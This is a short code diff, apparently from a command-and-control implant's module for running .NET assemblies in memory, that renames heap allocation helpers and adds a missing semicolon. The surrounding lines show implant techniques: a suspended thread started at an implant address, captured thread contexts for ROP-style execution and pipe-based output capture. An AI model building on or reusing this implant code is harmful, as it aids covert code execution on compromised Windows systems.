@@ -257,10 +257,10 @@ BOOL DotnetExecute( BUFFER Assembly, BUFFER Arguments )
     {
         if ( NT_SUCCESS( Instance.Win32.NtCreateThreadEx( &Instance.Dotnet->Thread, THREAD_ALL_ACCESS, NULL, NtCurrentProcess(), Instance.Config.Implant.ThreadStartAddr, NULL, TRUE, 0, 0x10000 * 20, 0x10000 * 20, &ThreadAttr ) ) )
         {
-            Instance.Dotnet->RopInit = NtHeapAlloc( sizeof( CONTEXT ) );
-            Instance.Dotnet->RopInvk = NtHeapAlloc( sizeof( CONTEXT ) );
-            Instance.Dotnet->RopEvnt = NtHeapAlloc( sizeof( CONTEXT ) );
-            Instance.Dotnet->RopExit = NtHeapAlloc( sizeof( CONTEXT ) );
+            Instance.Dotnet->RopInit = MmHeapAlloc( sizeof( CONTEXT ) );
+            Instance.Dotnet->RopInvk = MmHeapAlloc( sizeof( CONTEXT ) );
+            Instance.Dotnet->RopEvnt = MmHeapAlloc( sizeof( CONTEXT ) );
+            Instance.Dotnet->RopExit = MmHeapAlloc( sizeof( CONTEXT ) );
 
             Instance.Dotnet->RopInit->ContextFlags = CONTEXT_FULL;
             if ( NT_SUCCESS( Instance.Win32.NtGetContextThread( Instance.Dotnet->Thread, Instance.Dotnet->RopInit ) ) )
@@ -342,7 +342,7 @@ VOID DotnetPushPipe()
         if ( Read > 0 )
         {
             Instance.Dotnet->Output.Length = Read;
-            Instance.Dotnet->Output.Buffer = NtHeapAlloc( Instance.Dotnet->Output.Length );
+            Instance.Dotnet->Output.Buffer = MmHeapAlloc( Instance.Dotnet->Output.Length );
 
             Instance.Win32.ReadFile( Instance.Dotnet->Pipe, Instance.Dotnet->Output.Buffer, Instance.Dotnet->Output.Length, &BytesRead, NULL );
             Instance.Dotnet->Output.Length = BytesRead;
@@ -354,7 +354,7 @@ VOID DotnetPushPipe()
             if ( Instance.Dotnet->Output.Buffer )
             {
                 MemSet( Instance.Dotnet->Output.Buffer, 0, Read );
-                NtHeapFree( Instance.Dotnet->Output.Buffer )
+                MmHeapFree( Instance.Dotnet->Output.Buffer );
                 Instance.Dotnet->Output.Buffer = NULL;
             }
         }
@@ -510,7 +510,7 @@ VOID DotnetClose()
 
     if ( Instance.Dotnet ) {
         MemSet( Instance.Dotnet, 0, sizeof( DOTNET_ARGS ) );
-        NtHeapFree( Instance.Dotnet );
+        MmHeapFree( Instance.Dotnet );
         Instance.Dotnet = NULL;
     }
 }
